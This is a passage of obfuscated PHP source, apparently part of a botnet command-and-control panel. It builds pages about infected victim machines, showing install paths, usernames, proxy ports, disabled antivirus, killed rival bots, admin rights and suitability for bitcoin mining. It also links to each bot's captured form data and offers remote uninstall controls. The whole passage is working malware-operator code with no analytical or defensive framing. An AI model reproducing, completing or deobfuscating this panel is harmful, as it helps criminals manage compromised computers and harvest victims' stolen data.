    $_obfuscated_0D06012E293D1B040214283E2F252D12300E1D2B0A1832_ = $bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_BOT_SOURCE_USB ? "USB Infection" : "Spam / Exploit Pack / Other";
    $_obfuscated_0D27381A3D2427083E3803372C3913141A08351F251C22_ = 0 < $bot_record_info["LastInfoReport"] ? date("m/d/Y h:i:s a", $bot_record_info["LastInfoReport"]) : "<strong>Never</strong>";
    $_obfuscated_0D141E0330211F291834365C1B38070B36231839015C32_ = 0 < $bot_record_info["SocksPort"] ? $bot_record_info["SocksPort"] : "N/A";
    $_obfuscated_0D0B0E1E38323E112A0A2A022F0B15340527361A403011_ = "";
    if ($bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_HAS_SAMSUNG_DEVICE) {
        $_obfuscated_0D0B0E1E38323E112A0A2A022F0B15340527361A403011_ = "Samsung (Android)";
    }
    if ($bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_HAS_APPLE_DEVICE) {
        if (strlen($_obfuscated_0D0B0E1E38323E112A0A2A022F0B15340527361A403011_)) {
            $_obfuscated_0D0B0E1E38323E112A0A2A022F0B15340527361A403011_ = " <strong>/</strong> ";
        }
        $_obfuscated_0D0B0E1E38323E112A0A2A022F0B15340527361A403011_ = "Apple (iPhone/iPad)";
    }
    if (strlen($_obfuscated_0D0B0E1E38323E112A0A2A022F0B15340527361A403011_) == 0) {
        $_obfuscated_0D0B0E1E38323E112A0A2A022F0B15340527361A403011_ = "N/A";
    }
    $_obfuscated_0D321D342D021516065B3003103B0C3623222E0F2F2611_ = @htmlspecialchars(@_obfuscated_0D21062D170109343714073340281F30273128043B2C22_($bot_record_info["InstallPath"]));
    $_obfuscated_0D141B130532093D090A390B191D061C221238042D2C01_ = @htmlspecialchars(@_obfuscated_0D21062D170109343714073340281F30273128043B2C22_($bot_record_info["CompNameUsername"]));
    $_obfuscated_0D0E3C1204105C3306030629361C280B082919342D2401_ = strlen($bot_record_info["HostProcessName"]) ? @htmlspecialchars($bot_record_info["HostProcessName"]) : "N/A";
    $_obfuscated_0D30282F28030512163712112E290E09013C3535194032_ = strlen($bot_record_info["DefaultBrowser"]) ? @htmlspecialchars($bot_record_info["DefaultBrowser"]) : "N/A";
    if (strtolower(str_replace("", "", $_obfuscated_0D30282F28030512163712112E290E09013C3535194032_)) == "launcher.exe") {
        $_obfuscated_0D30282F28030512163712112E290E09013C3535194032_ .= " (Opera)";
    }
    $_obfuscated_0D2E0E301F0D5B3939271738321B1D30155C3039381B32_ = str_replace("", "", $bot_record_info["CpuName"]);
    $_obfuscated_0D2E0E301F0D5B3939271738321B1D30155C3039381B32_ = strlen($_obfuscated_0D2E0E301F0D5B3939271738321B1D30155C3039381B32_) ? @htmlspecialchars($_obfuscated_0D2E0E301F0D5B3939271738321B1D30155C3039381B32_) : "N/A";
    $_obfuscated_0D0B3E0F123F170A0E245B1F0F0434313B231F35133432_ = str_replace("", "", $bot_record_info["VideoCardName"]);
    $_obfuscated_0D0B3E0F123F170A0E245B1F0F0434313B231F35133432_ = strlen($_obfuscated_0D0B3E0F123F170A0E245B1F0F0434313B231F35133432_) ? @htmlspecialchars($_obfuscated_0D0B3E0F123F170A0E245B1F0F0434313B231F35133432_) : "N/A";
    $_obfuscated_0D241B190A0F2538365B0C29312125073E363D1F361001_ = str_replace("", "", $bot_record_info["ProductId"]);
    $_obfuscated_0D241B190A0F2538365B0C29312125073E363D1F361001_ = strlen($_obfuscated_0D241B190A0F2538365B0C29312125073E363D1F361001_) ? @htmlspecialchars($_obfuscated_0D241B190A0F2538365B0C29312125073E363D1F361001_) : "N/A";
    $_obfuscated_0D400E2E2940282B3701223026182C14193121182D3901_ = $bot_record_info["RecordAttributes"] & BOT_RECORD_IS_DIRTY ? "<font color=\"#E80000\">Dirty</font>" : "<font color=\"#339900\">Clean</font>";
    $_obfuscated_0D182B073304123C22100A0B19220A04230C1F07322E11_ = $bot_record_info["RecordAttributes"] & BOT_RECORD_IS_FAVORITE ? "Favorite" : "Normal";
    $_obfuscated_0D0F350308285C17112D073B26093F3F0B123235033E11_ = $bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_IS_ELEVATED ? "<font color=\"#339900\">Yes</font>" : "<font color=\"#E80000\">No</font>";
    $_obfuscated_0D2A281F0C183036331D1D025B1E17343E192A313B0311_ = $bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_IS_GOOD_FOR_BITCOINS ? "<font color=\"#339900\">Yes</font>" : "<font color=\"#E80000\">No</font>";
    $_obfuscated_0D391431391707191E1E12351701062A273B3D121F1922_ = $bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_IS_LAPTOP ? "Laptop" : "Desktop";
    $_obfuscated_0D3B2B303C5B1F103E14211A020B38403E351A183B3211_ = _obfuscated_0D351907351203383E0311143B1F363C0D183F09383D22_($bot_record_info["FirstCheckIn"], $bot_record_info["LastCheckIn"]);
    $_obfuscated_0D301E2A2D0E1F162413363C27352C3E3B2D0F092C1711_ = _obfuscated_0D0F1C3E3E150C5B2B32150B1F5B1030362B383D0E3422_($bot_record_info["AvsInstalled"]);
    $_obfuscated_0D115C0E0E2835161E020917100717242E2609130D0A22_ = "";
    if ((int) $bot_record_info["AvsKilled"] != 0) {
        $_obfuscated_0D115C0E0E2835161E020917100717242E2609130D0A22_ = "<br /><strong>AVs that appear to be disabled:</strong><br />";
    }
    $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ = "";
    if ((int) $bot_record_info["SoftwareInstalled"] != 0) {
        $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ = "<br /><strong>Installed software:</strong><br />";
        if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_JAVA) {
            $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ .= "Java<br />";
        }
        if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_SKYPE) {
            $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ .= "Skype<br />";
        }
        if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_VISUAL_STUDIO) {
            $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ .= "Some version of Visual Studio<br />";
        }
        if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_VM_SOFTWARE) {
            $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ .= "VMPlayer and/or VMWorkstation<br />";
        }
        if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_ORIGIN_CLIENT) {
            $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ .= "Origin gaming platform<br />";
        }
        if ($bot_record_info["SoftwareInstalled"] & BOT_ATTRIBUTE_HAS_STEAM) {
            $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ .= "Steam gaming platform<br />";
        }
        if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_BLIZZARD) {
            $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ .= "Blizzard gaming platform<br />";
        }
        if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_LEAGUE_OF_LEGENDS) {
            $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ .= "League Of Legends<br />";
        }
        if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_RUNESCAPE) {
            $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ .= "RuneScape<br />";
        }
        if ($bot_record_info["SoftwareInstalled"] & BOT_SOFTWARE_MINECRAFT) {
            $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ .= "Minecraft<br />";
        }
        $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_ .= "<br />";
    }
    $_obfuscated_0D39223C24013D0C273405222C3938370B12043E243E11_ = true;
    $_obfuscated_0D220637280F09392D5C0C0E301C09342128192E140922_ = (int) $bot_record_info["excp_access_violation"];
    $_obfuscated_0D243F0D301E402D280B253E1F13013E5B371839210311_ = (int) $bot_record_info["excp_priv_instruction"];
    $_obfuscated_0D3802222F050B183C3C3710111C013E300D0B12310801_ = (int) $bot_record_info["excp_illegal_instruction"];
    $_obfuscated_0D18183017150D2229191B0E19065B022821261A3D3632_ = (int) $bot_record_info["excp_stack_overflow"];
    $_obfuscated_0D09160D1D1C0508021A2E172328180D22330A1A2F2711_ = (int) $bot_record_info["excp_in_page_error"];
    $_obfuscated_0D23041C21190C5B362C3E370E2B27303E172A3C0C2501_ = (int) ($_obfuscated_0D220637280F09392D5C0C0E301C09342128192E140922_ + $_obfuscated_0D243F0D301E402D280B253E1F13013E5B371839210311_ + $_obfuscated_0D3802222F050B183C3C3710111C013E300D0B12310801_ + $_obfuscated_0D18183017150D2229191B0E19065B022821261A3D3632_ + $_obfuscated_0D09160D1D1C0508021A2E172328180D22330A1A2F2711_);
    $_obfuscated_0D2537270C35330F3C013216193136190921053C251732_ = "";
    $_obfuscated_0D2A163C330A173B212611373B0D0D18371F130C243022_ = "";
    if ((int) $bot_record_info["CrashRestartCount"] <= 2) {
        $_obfuscated_0D2A163C330A173B212611373B0D0D18371F130C243022_ = "#339900";
    } else {
        if (3 <= (int) $bot_record_info["CrashRestartCount"] && (int) $bot_record_info["CrashRestartCount"] <= 16) {
            $_obfuscated_0D2A163C330A173B212611373B0D0D18371F130C243022_ = "#C3C300";
        } else {
            $_obfuscated_0D2A163C330A173B212611373B0D0D18371F130C243022_ = "#E80000";
        }
    }
    if ((int) $bot_record_info["FileRestoreCount"] <= 2) {
        $_obfuscated_0D2537270C35330F3C013216193136190921053C251732_ = "#339900";
    } else {
        if (3 <= (int) $bot_record_info["FileRestoreCount"] && (int) $bot_record_info["FileRestoreCount"] <= 16) {
            $_obfuscated_0D2537270C35330F3C013216193136190921053C251732_ = "#C3C300";
        } else {
            $_obfuscated_0D2537270C35330F3C013216193136190921053C251732_ = "#E80000";
        }
    }
    $_obfuscated_0D3B161538101E0F1E13380B283E241F27033432313532_ = "<font color=\"" . $_obfuscated_0D2537270C35330F3C013216193136190921053C251732_ . "\">" . (int) $bot_record_info["FileRestoreCount"] . "</font>";
    $_obfuscated_0D5B0906031A035B011C2C17382F24223222222E331511_ = "<font color=\"" . $_obfuscated_0D2A163C330A173B212611373B0D0D18371F130C243022_ . "\">" . (int) $bot_record_info["CrashRestartCount"] . "</font>";
    $_obfuscated_0D2B2D24400F0F0439241A292A2A3B3034210E141C1F11_ = @long2ip($bot_record_info["LastIP"]);
    global $sqlGeoIP;
    $_obfuscated_0D1C2934220C11212E183240240D113E18300B131E3122_ = "";
    $_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_ = $bot_record_info["LocaleName"];
    if (0 < strlen($bot_record_info["Locale"])) {
        if (strlen($_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_) < 2) {
            $_obfuscated_0D01402A2D23091F1B1A262E272827271138231B062E11_ = $sqlGeoIP->GetLocationFromIso2Code($bot_record_info["Locale"]);
            if (isset($_obfuscated_0D01402A2D23091F1B1A262E272827271138231B062E11_["COUNTRY_NAME"])) {
                $_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_ = $_obfuscated_0D01402A2D23091F1B1A262E272827271138231B062E11_["COUNTRY_NAME"];
            }
        }
        if (strlen($_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_) == 0) {
            $_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_ = "<i>N/A</i>";
        } else {
            $_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_ = htmlspecialchars($_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_);
        }
        $_obfuscated_0D1C2934220C11212E183240240D113E18300B131E3122_ = "<img src=\"" . $sqlGeoIP->GetFlagPath($bot_record_info["Locale"]) . "\"></img>&nbsp;" . $_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_ . " (" . $bot_record_info["Locale"] . ")";
    } else {
        $_obfuscated_0D1C2934220C11212E183240240D113E18300B131E3122_ = "Unknown";
    }
    echo "<div class=\"container\">";
    echo "<div id=\"qkinfo" . $bot_record_info["id"] . "\" class=\"modal hide fade in\" style=\"display: none;  width: 880px; margin: -230px 0 0 -410px;\">";
    echo "<div class=\"modal-header\"><a class=\"close\" data-dismiss=\"modal\">x</a>";
    echo "<h3><center>Quick information for <i>" . $_obfuscated_0D2B2D24400F0F0439241A292A2A3B3034210E141C1F11_ . "</i> &nbsp;&nbsp;&nbsp;(#" . $_obfuscated_0D36050A01391F1623350F0626141A1215233238375C32_ . ")</center></h3>";
    echo "</div><div class=\"modal-body\"><font size=\"1\" face=\"Tahoma\"><table class=\"table-condensed\" align=\"left\"><thead><tr><th width=\"40\"></th><th width=\"600\"></th></tr></thead><tbody><tr width=\"15%\"><td valign=\"top\">Status:<br />Bot GUID:<br />Source:<br />Install Path:<br />Install Date:<br />Last CheckIn:<br />Bot owned for:</br />Operating System:<br />Local Time:<br />IP:<br />Country:<br />SOCKS4 Port:<br />Bots killed since installed:<br />-<br />Host process:<br />Default Browser:<br />Login Username:<br />CPU Info:<br />Video Card Info:<br />Windows ProductId:<br />Detected AntiVirus:<br />Total times persistence restored bot disk image:<br />";
    if ($_obfuscated_0D39223C24013D0C273405222C3938370B12043E243E11_ == true) {
        echo "Total times bot restarted due to crash:<br />Total serious exceptions:<br />Access Violations:<br />Priv Instruction:<br />Illegal Instruction:<br />Stack Overflow:<br />In Page Error:<br />";
    }
    echo "Running with Administrator privileges:<br />Has .NET Framework installed:<br />Has Java installed:<br />Has ever used Windows RDP:<br />Connected phone devices:<br />Computer Type:<br />Task dirty status:<br />Watch status:<br />Comments:<br /></td><td valign=\"top\" align=\"right\">";
    echo (string) $_obfuscated_0D27232E2A3325073B022315031F211F251B26073F1B11_ . "<br />";
    echo @strtoupper(@bin2hex($bot_record_info["GUID"])) . "<br />";
    echo (string) $_obfuscated_0D06012E293D1B040214283E2F252D12300E1D2B0A1832_ . "<br />";
    echo $_obfuscated_0D321D342D021516065B3003103B0C3623222E0F2F2611_ . "<br />";
    echo date("m/d/Y h:i:s a", $bot_record_info["FirstCheckIn"]) . "<br /> ";
    echo date("m/d/Y h:i:s a", $bot_record_info["LastCheckIn"]) . "<br />";
    echo (string) $_obfuscated_0D3B2B303C5B1F103E14211A020B38403E351A183B3211_ . "<br />";
    echo $botsIndex->GetFullOsStringFromMask($bot_record_info["OS"], true) . "<br /> ";
    echo date("h:i:s a", $bot_record_info["BotTime"]) . "<br />";
    echo "<a target=\"_blank\" href=\"http://www.whois.net/ip-address-lookup/" . $_obfuscated_0D2B2D24400F0F0439241A292A2A3B3034210E141C1F11_ . "\">" . $_obfuscated_0D2B2D24400F0F0439241A292A2A3B3034210E141C1F11_ . "</a><br />";
    echo (string) $_obfuscated_0D1C2934220C11212E183240240D113E18300B131E3122_ . "<br />";
    echo (string) $_obfuscated_0D141E0330211F291834365C1B38070B36231839015C32_ . "<br />";
    echo "<font color=\"#E80000\">" . $bot_record_info["BotsKilled"] . "</font><br />";
    echo "<br />";
    echo (string) $_obfuscated_0D0E3C1204105C3306030629361C280B082919342D2401_ . "<br />";
    echo (string) $_obfuscated_0D30282F28030512163712112E290E09013C3535194032_ . "<br />";
    echo (string) $_obfuscated_0D141B130532093D090A390B191D061C221238042D2C01_ . "<br />";
    echo (string) $_obfuscated_0D2E0E301F0D5B3939271738321B1D30155C3039381B32_ . "<br />";
    echo (string) $_obfuscated_0D0B3E0F123F170A0E245B1F0F0434313B231F35133432_ . "<br />";
    echo (string) $_obfuscated_0D241B190A0F2538365B0C29312125073E363D1F361001_ . "<br />";
    echo (string) $_obfuscated_0D301E2A2D0E1F162413363C27352C3E3B2D0F092C1711_ . "<br />";
    echo (string) $_obfuscated_0D3B161538101E0F1E13380B283E241F27033432313532_ . "<br />";
    if ($_obfuscated_0D39223C24013D0C273405222C3938370B12043E243E11_ == true) {
        echo (string) $_obfuscated_0D5B0906031A035B011C2C17382F24223222222E331511_ . "<br />";
        echo (string) $_obfuscated_0D23041C21190C5B362C3E370E2B27303E172A3C0C2501_ . "<br />";
        echo (string) $_obfuscated_0D220637280F09392D5C0C0E301C09342128192E140922_ . "<br />";
        echo (string) $_obfuscated_0D243F0D301E402D280B253E1F13013E5B371839210311_ . "<br />";
        echo (string) $_obfuscated_0D3802222F050B183C3C3710111C013E300D0B12310801_ . "<br />";
        echo (string) $_obfuscated_0D18183017150D2229191B0E19065B022821261A3D3632_ . "<br />";
        echo (string) $_obfuscated_0D09160D1D1C0508021A2E172328180D22330A1A2F2711_ . "<br />";
    }
    echo (string) $_obfuscated_0D0F350308285C17112D073B26093F3F0B123235033E11_ . "<br />";
    echo ($bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_HAS_NET_FRAMEWORK ? "Yes" : "No") . "<br />";
    echo ($bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_HAS_JAVA ? "Yes" : "No") . "<br />";
    echo ($bot_record_info["ClientAttributes"] & BOT_ATTRIBUTE_HAS_USED_RDP ? "Yes" : "No") . "<br />";
    echo (string) $_obfuscated_0D0B0E1E38323E112A0A2A022F0B15340527361A403011_ . "<br />";
    echo (string) $_obfuscated_0D391431391707191E1E12351701062A273B3D121F1922_ . "<br />";
    echo (string) $_obfuscated_0D400E2E2940282B3701223026182C14193121182D3901_ . "<br />";
    echo (string) $_obfuscated_0D182B073304123C22100A0B19220A04230C1F07322E11_ . "<br />";
    echo "<br /></td></tr><tr><td>";
    echo "<input type=\"text\" class=\"span3\" name=\"exinfo_comment2\" id=\"exinfo_comment2\" value=\"" . @htmlspecialchars($bot_record_info["Comments"]) . "\">";
    echo "<br />";
    echo (string) $_obfuscated_0D152804102C1109240F053E102F5C0B2F3F160A2B2E01_;
    echo "</td></tr></tbody></table></font></div><div class=\"modal-footer\" align=\"right\">";
    $_obfuscated_0D220A30223E3812121C3F1E0D321D0919383C053B1332_ = $bot_record_info["RecordAttributes"] & BOT_RECORD_IS_FAVORITE ? "-345px" : "-390px";
    echo "<span style=\"position: relative; left: " . $_obfuscated_0D220A30223E3812121C3F1E0D321D0919383C053B1332_ . ";\">";
    echo "<button class=\"btn\" onclick=\"window.location.href='?mod=viewbot&id=" . $_obfuscated_0D36050A01391F1623350F0626141A1215233238375C32_ . "'\">View full bot information</button>";
    echo "</span>";
    echo "<form style=\"display:inline;\" method=\"post\" action=\"" . $_SERVER["REQUEST_URI"] . "\">";
    echo "<input type=\"hidden\" name=\"exinfo_bot_id\" value=\"" . $_obfuscated_0D36050A01391F1623350F0626141A1215233238375C32_ . "\"><!-- Bot ID -->";
    echo "<input type=\"hidden\" name=\"exinfo_comment\" id=\"exinfo_comment\" value=\"" . $_obfuscated_0D36050A01391F1623350F0626141A1215233238375C32_ . "\"><!-- Bot ID -->";
    if ($bot_record_info["RecordAttributes"] & BOT_RECORD_IS_FAVORITE) {
        echo "<input type=\"submit\" class=\"btn\" name=\"exinfo_submit_unfavorite\" value=\"Remove from favorites\">";
    } else {
        echo "<input type=\"submit\" class=\"btn\" name=\"exinfo_submit_favorite\" value=\"Add to favorites\">";
    }
    echo "<input type=\"submit\" class=\"btn\" name=\"exinfo_submit_comment\" value=\"Save comment\" onclick=\"getElementById('exinfo_comment').value = getElementById('exinfo_comment2').value;\"><a href=\"#\" class=\"btn\" data-dismiss=\"modal\">Close</a></div></form></div></div>";
    return true;
}
function _obfuscated_0D0E370B123D313E2D2515080B1B24292E363522350632_($p_row, $is_favorites)
{
    global $is_exgeo_extended;
    global $sqlGeoIP;
    global $botsIndex;
    global $Session;
    global $sqlSettings;
    $_obfuscated_0D2D272330230D2A29230D1F3F2D0B0B370510025B2811_ = $p_row["id"];
    $_obfuscated_0D3225373E08231E292D1005271D1A101A2B173D1D3E32_ = $p_row["GUID"];
    $_obfuscated_0D3422381B3F1E0E161A3E2F340C5C5C122738060C1511_ = $p_row["Version"];
    $_obfuscated_0D0B283B121323280D13283F151F232B22370D15042622_ = $p_row["GroupName"];
    $_obfuscated_0D330940281718241D0C163D2C18211A341B391D382432_ = $p_row["LastIP"];
    $_obfuscated_0D140B132C2306362E161918051A3723390505153D2411_ = $p_row["Locale"];
    $_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_ = $p_row["LocaleName"];
    $_obfuscated_0D1B133D113E11313E06162607343D5C031910403D0132_ = $p_row["OS"];
    $_obfuscated_0D261B302E2E1D33014016263F2A2C382A0D1233383222_ = $p_row["FirstCheckIn"];
    $_obfuscated_0D26121A2A3121272C14082B0D40123018140F3F222D32_ = $p_row["LastCheckIn"];
    $_obfuscated_0D1E285B4023045C232A1C0F3D5B0B3E30392A5C171311_ = $p_row["AvsInstalled"];
    $_obfuscated_0D3F291F1E1A38101E12261517105C1D131E181F051611_ = $p_row["BotsKilled"];
    $_obfuscated_0D221A08041C193C10030119240D1D123E2A2B1B291501_ = $p_row["ClientStatus"];
    $_obfuscated_0D370C12153B3302112925211F2F5C122713291B0C0B11_ = $p_row["ClientAttributes"];
    $_obfuscated_0D5B01392419081A3432052F5B262B0C1D011D33011211_ = 3 < strlen($p_row["CpuName"]) ? htmlspecialchars($p_row["CpuName"]) : "<i>N/A</i>";
    $_obfuscated_0D39303E36255B03375C5C5C33162A0735142A343B2C32_ = 3 < strlen($p_row["VideoCardName"]) ? htmlspecialchars($p_row["VideoCardName"]) : "<i>N/A</i>";
    $_obfuscated_0D1F173429235C38082C36375C3D2E06352111051E2D32_ = strlen($p_row["CompNameUsername"]) ? htmlspecialchars($p_row["CompNameUsername"]) : "<i>N/A</i>";
    $_obfuscated_0D011B061C1F370E281115271F29112B2C231F5B330C11_ = strlen($p_row["Comments"]) ? htmlspecialchars($p_row["Comments"]) : "<i>N/A</i>";
    $_obfuscated_0D2C2D0D0E370B2924263E135C21011F35281E073F1322_ = strlen($p_row["HostProcessName"]) ? htmlspecialchars($p_row["HostProcessName"]) : "<i>N/A</i>";
    if ($_obfuscated_0D221A08041C193C10030119240D1D123E2A2B1B291501_ == BOT_STATUS_ONLINE) {
        $_obfuscated_0D163F401323082F1236161909340615373B2719211C32_ = "<font color=\"#339900\">Online</font>";
    } else {
        if ($_obfuscated_0D221A08041C193C10030119240D1D123E2A2B1B291501_ == BOT_STATUS_OFFLINE) {
            $_obfuscated_0D163F401323082F1236161909340615373B2719211C32_ = "<font color=\"#E80000\">Offline</font>";
        } else {
            if ($_obfuscated_0D221A08041C193C10030119240D1D123E2A2B1B291501_ == BOT_STATUS_DELETED) {
                $_obfuscated_0D163F401323082F1236161909340615373B2719211C32_ = "<font color=\"#E80000\">Deleted</font>";
            } else {
                if ($_obfuscated_0D221A08041C193C10030119240D1D123E2A2B1B291501_ == BOT_STATUS_DEAD) {
                    $_obfuscated_0D163F401323082F1236161909340615373B2719211C32_ = "Dead";
                } else {
                    $_obfuscated_0D163F401323082F1236161909340615373B2719211C32_ = "Unknown";
                }
            }
        }
    }
    $_obfuscated_0D213F12370B392B2B5C5B3F16191404362C390E1F3D01_ = long2ip($_obfuscated_0D330940281718241D0C163D2C18211A341B391D382432_);
    $_obfuscated_0D08080C0A0B37050A1311101432223001071229321211_ = "";
    $_obfuscated_0D0D365B300C242A2E27092A5C0C36082F2A100D322732_ = (int) $_obfuscated_0D2D272330230D2A29230D1F3F2D0B0B370510025B2811_;
    if (strlen($_obfuscated_0D0B283B121323280D13283F151F232B22370D15042622_) == 0) {
        $_obfuscated_0D0B283B121323280D13283F151F232B22370D15042622_ = "<i>N/A</i>";
    } else {
        $_obfuscated_0D0B283B121323280D13283F151F232B22370D15042622_ = @htmlspecialchars($_obfuscated_0D0B283B121323280D13283F151F232B22370D15042622_);
    }
    if ((int) $_obfuscated_0D3422381B3F1E0E161A3E2F340C5C5C122738060C1511_ == 0) {
        $_obfuscated_0D08080C0A0B37050A1311101432223001071229321211_ = "<i>N/A</i>";
    } else {
        $_obfuscated_0D08080C0A0B37050A1311101432223001071229321211_ = _obfuscated_0D0A110C2D041029091F3828123D36173638131F0B2632_($_obfuscated_0D3422381B3F1E0E161A3E2F340C5C5C122738060C1511_);
    }
    if (0 < strlen($_obfuscated_0D140B132C2306362E161918051A3723390505153D2411_)) {
        if (strlen($_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_) < 2) {
            $_obfuscated_0D01402A2D23091F1B1A262E272827271138231B062E11_ = $sqlGeoIP->GetLocationFromIso2Code($_obfuscated_0D140B132C2306362E161918051A3723390505153D2411_);
            if (isset($_obfuscated_0D01402A2D23091F1B1A262E272827271138231B062E11_["COUNTRY_NAME"])) {
                $_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_ = $_obfuscated_0D01402A2D23091F1B1A262E272827271138231B062E11_["COUNTRY_NAME"];
            }
        }
        if (strlen($_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_) == 0) {
            $_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_ = "<i>N/A</i>";
        } else {
            $_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_ = htmlspecialchars($_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_);
        }
        $_obfuscated_0D1C2934220C11212E183240240D113E18300B131E3122_ = "<img src=\"" . $sqlGeoIP->GetFlagPath($_obfuscated_0D140B132C2306362E161918051A3723390505153D2411_) . "\"></img>&nbsp;<span style=\"position: relative; top: 1px;\">" . $_obfuscated_0D042C2B311814083E051A350A3D0B3E1C2D0321110511_ . " (" . $_obfuscated_0D140B132C2306362E161918051A3723390505153D2411_ . ")</span>";
    } else {
        if (strpos($_obfuscated_0D213F12370B392B2B5C5B3F16191404362C390E1F3D01_, "192.168.") === 0 || strpos($_obfuscated_0D213F12370B392B2B5C5B3F16191404362C390E1F3D01_, "10.") === 0 || strpos($_obfuscated_0D213F12370B392B2B5C5B3F16191404362C390E1F3D01_, "127.") === 0 || strpos($_obfuscated_0D213F12370B392B2B5C5B3F16191404362C390E1F3D01_, "172.16.") === 0) {
            $_obfuscated_0D1C2934220C11212E183240240D113E18300B131E3122_ = "Local Area Network";
        } else {
            $_obfuscated_0D1C2934220C11212E183240240D113E18300B131E3122_ = "Unknown";
        }
    }
    $_obfuscated_0D2C23350F5C142804340E342D19121A2A0C3734150722_ = _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("&client_view=" . $_obfuscated_0D0D365B300C242A2E27092A5C0C36082F2A100D322732_);
    $_obfuscated_0D39041B3F0628051622041910262703060A0E35220701_ = _obfuscated_0D2E100C0E5C0C222B12232906321E2D26380404135C01_("&client_view=" . $_obfuscated_0D0D365B300C242A2E27092A5C0C36082F2A100D322732_);
    $_obfuscated_0D32321D5B061A25220D210201155C4018010F3C110A01_ = _obfuscated_0D095B10152B111B39392E5C04180E10343B270D323601_("&delete_bot=" . $_obfuscated_0D0D365B300C242A2E27092A5C0C36082F2A100D322732_);
    if (!((int) $Session->Rights() & USER_PRIVILEGES_VIEW_BOT_INFO)) {
        $_obfuscated_0D0B3028392611063F1E5B021E07130B115B033D3D2F22_ = "<img src=\"img/page/info.png\" title=\"You do not have permission to view quick information\">&nbsp;";
    } else {
        $_obfuscated_0D0B3028392611063F1E5B021E07130B115B033D3D2F22_ = "<a data-toggle=\"modal\" title=\"Display quick information\" href=\"#qkinfo" . $_obfuscated_0D0D365B300C242A2E27092A5C0C36082F2A100D322732_ . "\"><img src=\"img/page/info.png\"></a>&nbsp;";
    }
    if (!((int) $Session->Rights() & USER_PRIVILEGES_VIEW_LOGS)) {
        $_obfuscated_0D0B3028392611063F1E5B021E07130B115B033D3D2F22_ .= "<img src=\"img/page/logs.png\" title=\"View stored forms for this bot\">&nbsp;";
    } else {
        $_obfuscated_0D0B3028392611063F1E5B021E07130B115B033D3D2F22_ .= "<a href=\"" . $_obfuscated_0D2C23350F5C142804340E342D19121A2A0C3734150722_ . "\" title=\"View stored forms for this bot\"><img src=\"img/page/logs.png\"></a>&nbsp;";
    }
    if ($_obfuscated_0D221A08041C193C10030119240D1D123E2A2B1B291501_ == BOT_STATUS_DELETED || !((int) $Session->Rights() & USER_PRIVILEGES_CMD_UNINSTALL)) {
        $_obfuscated_0D0B3028392611063F1E5B021E07130B115B033D3D2F22_ .= "<img src=\"img/page/delete.png\" title=\"Bot is either already deleted or you do not have permission to uninstall\">";
    } else {
        $_obfuscated_0D0B3028392611063F1E5B021E07130B115B033D3D2F22_ .= "<a href=\"" . $_obfuscated_0D32321D5B061A25220D210201155C4018010F3C110A01_ . "\" title=\"Uninstall bot. This action cannot be reversed!\"><img src=\"img/page/delete.png\"></a>";
    }
    $_obfuscated_0D301E2A2D0E1F162413363C27352C3E3B2D0F092C1711_ = _obfuscated_0D3E0A1130181635162E3526020C0F1B342E031A221011_($_obfuscated_0D1E285B4023045C232A1C0F3D5B0B3E30392A5C171311_);
    $_obfuscated_0D3B302127093119042F13121705342E16235B180D3F01_ = $_obfuscated_0D3F291F1E1A38101E12261517105C1D131E181F051611_;
    if (0 < (int) $_obfuscated_0D3F291F1E1A38101E12261517105C1D131E181F051611_) {
        $_obfuscated_0D3B302127093119042F13121705342E16235B180D3F01_ = "<font color=\"#E80000\">" . $_obfuscated_0D3F291F1E1A38101E12261517105C1D131E181F051611_ . "</font>";
    }
    $_obfuscated_0D29400D38035B0F033C36082918035C36353605300332_ = "";
    if ($is_exgeo_extended == true) {
